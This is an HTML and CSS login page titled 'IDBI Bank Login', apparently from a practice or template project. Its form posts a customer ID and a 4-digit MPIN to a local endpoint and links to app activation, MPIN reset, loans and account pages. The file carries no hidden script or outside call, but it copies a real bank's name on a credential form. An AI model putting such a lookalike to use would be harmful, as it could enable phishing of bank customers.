<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="ISO-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IDBI Bank Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e0f7fa, #80deea);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background-color: #ffffff;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.15);
            text-align: center;
            width: 100%;
            max-width: 400px;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo img {
            width: 100px;
            margin-bottom: 20px;
            animation: fadeIn 1.2s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        h2 {
            color: #007bff;
            margin-bottom: 25px;
            font-size: 24px;
        }

        form input[type="text"],
        form input[type="password"] {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 16px;
            transition: 0.3s;
        }

        form input[type="text"]:focus,
        form input[type="password"]:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 6px #007bff33;
        }

        form input[type="submit"] {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
            transition: background 0.3s ease;
        }

        form input[type="submit"]:hover {
            background: linear-gradient(90deg, #0056b3, #004494);
        }

        .links {
            margin-top: 25px;
        }

        .links a {
            display: block;
            color: #007bff;
            text-decoration: none;
            margin: 10px 0;
            transition: 0.3s;
            font-size: 15px;
        }

        .links a:hover {
            color: #004494;
            text-decoration: underline;
        }

        .footer {
            margin-top: 25px;
            font-size: 13px;
            color: #555;
        }

        @media (max-width: 480px) {
            h2 {
                font-size: 20px;
            }

            .container {
                padding: 30px 20px;
            }

            form input[type="submit"] {
                padding: 12px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Replace the image source below with your actual logo path -->
        </div>
        <h2>Welcome to IDBI Bank</h2>
        <form action="log" method="post">
            <input type="text" name="cid" placeholder="Enter Customer ID" required>
            <input type="password" name="pass" placeholder="Enter 4-digit MPIN" required>
            <input type="submit" value="LOGIN">
        </form>
        <div class="links">
            <a href="reg">Activate App</a>
            <a href="resetMpin">Reset MPIN</a>
            <a href="aLoan">Apply for Loans</a>
            <a href="wel">Open Savings Account</a>
            <a href="mpass">mPassbook</a>
        </div>
        <div class="footer">
            <p>UPI Safety Guidelines</p>
            <p>Celebrating 60 Years of Partnership</p>
        </div>
    </div>
</body>
</html>
